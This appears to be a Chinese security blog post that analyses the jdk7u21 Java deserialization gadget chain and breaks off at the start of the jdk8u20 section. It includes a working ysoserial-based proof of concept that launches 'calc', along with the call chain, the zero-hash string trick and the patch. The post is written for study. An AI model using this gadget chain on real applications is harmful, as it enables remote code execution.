    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><p>前言：最近缺少sink点，看看前辈们是怎么利用原生链的</p>
<blockquote>
<p>然后jdk7u21对其构造细节进行了一些分析吧，自我感觉分析的挺全的了，没啥难度</p>
<p>jdk8u20主要是根据参考种跳跳糖那篇文章，学习的。有点难度的。思路到不难，就是最后那个报错的完全理解什么原因以及怎么处理！感觉参考文章那个点不是很清楚，于是根据自己的理解又去琢磨琢磨了那个点</p>
</blockquote>
<h2 id="jdk7u21">jdk7u21<a hidden class="anchor" aria-hidden="true" href="#jdk7u21">#</a></h2>
<blockquote>
<p>简短概述下吧，利用<code>AnnotationInvocationHandler</code>#<code>invoke</code>方法中<code>动态代理</code> <code>调用的方法为equals时</code>对应if选项里代码，其会通过(<code>for循环</code>反射调用)去调用<code>type属性</code>的所有方法（这里也就设置<code>type</code>为<code>Templates.class</code>，然后调用的<code>对象</code>为<code>equals(obj)</code>的参数，所以这里obj是<code>TemplatesImpl</code>即可进行利用）</p>
<p>然后还有个难点是hash的判断，利用map的<code>equals</code>，都需要构造一个hash相等的东西（这里7u21作者的设计还挺有意思的）那就一起简单看看吧</p>
</blockquote>
<p><strong>调用链</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">LinkedHashSet</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">LinkedHashSet</span><span class="p">.</span><span class="na">add</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">LinkedHashSet</span><span class="p">.</span><span class="na">add</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">Proxy</span><span class="p">(</span><span class="n">Templates</span><span class="p">).</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">hashCodeImpl</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">memberValueHashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">Proxy</span><span class="p">(</span><span class="n">Templates</span><span class="p">).</span><span class="na">equals</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">equalsImpl</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Method</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getOutputProperties</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>这里其实到<code>Proxy(Templates).equals()</code>前都是为了进入<code>equals这步if</code>，前面都是为了hash相等的构造（也就是核心sink利用步骤只有后面这段）</p>
<h3 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h3>
<p>poc是直接用的ysoserial的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.Jdk7u21</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jdk7u21_poc</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">zeroHashCodeStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;f5a5a608&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">zeroHashCodeStr</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;foo&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">tempHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">tempHandler</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Templates</span><span class="p">)</span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createProxy</span><span class="p">(</span><span class="n">tempHandler</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_auxClasses&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">zeroHashCodeStr</span><span class="p">,</span><span class="w"> </span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">ser</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="hash">hash<a hidden class="anchor" aria-hidden="true" href="#hash">#</a></h3>
<p>链子整体没啥讲的，很简单。主要是<code>hash</code>那</p>
<p>主要要满足两次进入put时，hash要一样，且第一次设置的<code>key</code>(就是第二次的k)得是<code>TemplatesImpl</code>（因为这个是作为最后invoke的object进行调用的）也就是说<code>proxy</code>put调用前，得有一个存储值key得是<code>TemplatesImpl</code>且hash要和<code>proxy</code>计算出的hash相同</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HashSet</span><span class="o">&lt;</span><span class="n">E</span><span class="o">&gt;</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="n">size</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">E</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">E</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="n">PRESENT</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250507182751938.png" alt="image-20250507182751938"  />
</p>
<p>然后这里<code>TemplatesImpl</code>的<code>hashcode()</code>调用是直接调用<code>Object的hashcode()</code></p>
<p>而<code>proxy</code>的<code>hashcode()</code>这里则是有对应的处理方式（这里其实可以控制返回0，但是<code>TemplatesImpl</code>的<code>hashcode()</code>不可能为0，所以不能这样构造</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hashCodeImpl</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Iterator</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">memberValues</span><span class="p">.</span><span class="na">entrySet</span><span class="p">().</span><span class="na">iterator</span><span class="p">();</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">hasNext</span><span class="p">();</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">127</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">var3</span><span class="p">.</span><span class="na">getKey</span><span class="p">()).</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">memberValueHashCode</span><span class="p">(</span><span class="n">var3</span><span class="p">.</span><span class="na">getValue</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><code>this.memberValues</code>可以初始化设置，可以看到返回的是<code>var1</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">var1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">127</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">var3</span><span class="p">.</span><span class="na">getKey</span><span class="p">()).</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">memberValueHashCode</span><span class="p">(</span><span class="n">var3</span><span class="p">.</span><span class="na">getValue</span><span class="p">()))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">memberValueHashCode</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">var0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var1</span><span class="p">.</span><span class="na">isArray</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">hashCode</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>然后7u21的作者是爆破了一个<code>((String)var3.getKey()).hashCode()</code>的值为**<code>0</code>**的数(<code>&quot;f5a5a608&quot;</code>)</p>
<p>然后再让<code>var3.getValue()</code>为第一次存储的<code>TemplatesImpl</code>为同一个对象，即可实现和第一次的hash值相等</p>
<p>巧的点就在这hhh，我第一反义肯定想不到<code>一个有值的String.hashcode()的值会为0</code>！！</p>
<h3 id="-string-hashcode--整形溢出">[*] String hashcode &amp; 整形溢出<a hidden class="anchor" aria-hidden="true" href="#-string-hashcode--整形溢出">#</a></h3>
<p>然后就好奇呀，就去看代码了，发现是溢出导致的负数从而导致可以得到<code>0</code>这个值hhh，挺有意思的，第一次直观感受到整形溢出的利用</p>
<p><img loading="lazy" src="images/image-20250507185246029.png" alt="image-20250507185246029"  />
</p>
<p>然后写了个小demo，感觉挺有意思的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">hashtest</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">MAX_VALUE</span><span class="p">);</span><span class="w">  </span><span class="c1">// 输出 2147483647</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">MIN_VALUE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">*</span><span class="n">100</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">*</span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">+</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="o">-</span><span class="n">2147483648</span><span class="o">-</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="o">-</span><span class="n">2147483648</span><span class="o">*</span><span class="n">3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">*</span><span class="n">3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="na">hashCode</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">输出</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2147483647</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2147483648</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">100</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2147483648</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2147483647</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2147483648</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2147483645</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0</span><span class="w">
</span></span></span></code></pre></div><p>然后对<code>int的值域</code>的理解，其实类似一个<code>环形</code>（<code>最小值</code>连接着<code>最大值</code>，min-1=max，max+1=min）</p>
<p>这里简单解释下<code>-2147483648*2 = 0</code> ，<code>2147483647*2 = -2</code></p>
<p>这里其实就是二进制下<code>右移一步</code></p>
<p>-2147483648是10000000 00000000 00000000 00000000右移后直接00000000 00000000 00000000 00000000也就为0了</p>
<p>2147483647是01111111 11111111 11111111 11111111右移后11111111 11111111 11111111 11111110，这里开头是<code>1</code>要采用<code>补码机制</code>，即为<code>-</code>号，<strong>然后取反再+1</strong></p>
<p>取反00000000 00000000 00000000 00000001+1得00000000 00000000 00000000 00000010然后符号</p>
<p>所以为<code>-2</code>hh，都快忘了hh 很明白了吧</p>
<h3 id="-值2">[*] 值2<a hidden class="anchor" aria-hidden="true" href="#-值2">#</a></h3>
<p>当然这里值肯定不止<code>f5a5a608</code>一个，但是呢我可能想不到<code>溢出</code>但是我肯定会想到<code>&quot;&quot;</code>空值</p>
<p>我们看到String的hash默认是为<code>0</code>的</p>
<p><img loading="lazy" src="images/image-20250507194950775.png" alt="image-20250507194950775"  />
</p>
<p>再看String的hashCode()代码，是不是只有<code>不进入这个if</code>，即可得到<code>hash</code>为<code>0</code>的字符串了呢</p>
<p><img loading="lazy" src="images/image-20250507195046992.png" alt="image-20250507195046992"  />
</p>
<p>也就是让length&lt;=0即可，即<code>&quot;&quot;.hashCode()</code>，验证可行hh</p>
<p>然后其实这里equals的触发，<code>CC7的map</code>我觉得也完全没问题，感兴趣可以看看我CC7的几种绕过hash相等的问题</p>
<p><img loading="lazy" src="images/image-20250507195410886.png" alt="image-20250507195410886"  />
</p>
<h3 id="put点">put点<a hidden class="anchor" aria-hidden="true" href="#put点">#</a></h3>
<p>还有一个关于put顺序的poc设计吧，也是类似CC链的。</p>
<p><code>map</code>这个值存放到<code>AnnotationInvocationHandler.this.memberValues</code>用于hash的运算</p>
<p>然后这里map没有直接存<code>TemplatesImpl对象</code>，因为下方<code>LinkedHashSet#add</code>会触发map#put-&gt;hash的检测——&gt;触发equals调用-&gt;触发sink报错中断</p>
<p>所以这里等<code>LinkedHashSet#add</code>完，再put覆盖成对应的<code>TemplatesImpl对象</code>，其他应该没啥说的了这条链子</p>
<p><img loading="lazy" src="images/image-20250508091949622.png" alt="image-20250508091949622"  />
</p>
<h3 id="7u21的修复">7u21的修复<a hidden class="anchor" aria-hidden="true" href="#7u21的修复">#</a></h3>
<p>对我们<code>type</code>进行了<code>类型限制</code>，导致我们将<code>type</code>设置成<code>Templates.class</code>时会<code>throw错误</code>中断我们的反序列化，</p>
<p><img loading="lazy" src="images/image-20250509202747794.png" alt="image-20250509202747794"  />
</p>
<h2 id="jdk8u20">jdk8u20<a hidden class="anchor" aria-hidden="true" href="#jdk8u20">#</a></h2>
<blockquote>
<p>这里主要依靠的是@1nhann师傅那篇文章，不轻松捏</p>
</blockquote>
<p>针对7u21的绕过，主要利用两个特性</p>
<ul>
<li>双层try/catch</li>
<li>TC_REFERENCE</li>
</ul>
<h3 id="双层trycatch">双层try/catch<a hidden class="anchor" aria-hidden="true" href="#双层trycatch">#</a></h3>
